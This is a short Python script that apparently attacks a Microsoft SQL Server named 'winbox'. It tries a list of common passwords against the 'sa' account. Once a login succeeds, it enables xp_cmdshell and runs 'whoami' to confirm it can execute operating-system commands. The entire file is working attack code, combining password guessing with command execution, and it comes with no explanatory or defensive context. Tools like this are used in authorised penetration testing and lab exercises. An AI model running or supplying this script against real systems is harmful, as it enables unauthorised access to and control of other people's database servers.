#!/usr/bin/env python3
import pymssql
passwords = ['sa', 'SQL2022', 'admin', 'Welcome1', 'P@ssw0rd', 'Password123', 'Password1']
for pwd in passwords:
    print(f'[*] Trying sa/{pwd}...')
    try:
        conn = pymssql.connect('winbox', 'sa', pwd, port=1433, login_timeout=5, autocommit=True)
        print(f'[+] SUCCESS: sa/{pwd}')
        cur = conn.cursor()
        cur.execute("EXEC sp_configure 'show advanced options',1;RECONFIGURE")
        cur.execute("EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE")
        cur.execute("EXEC xp_cmdshell 'whoami'")
        for row in cur:
            if row[0]: print(f'[+] Running as: {row[0]}')
        conn.close()
        break
    except pymssql.OperationalError as e:
        print(f'[-] Failed: {e}')
    except Exception as e:
        print(f'[-] Error: {e}')
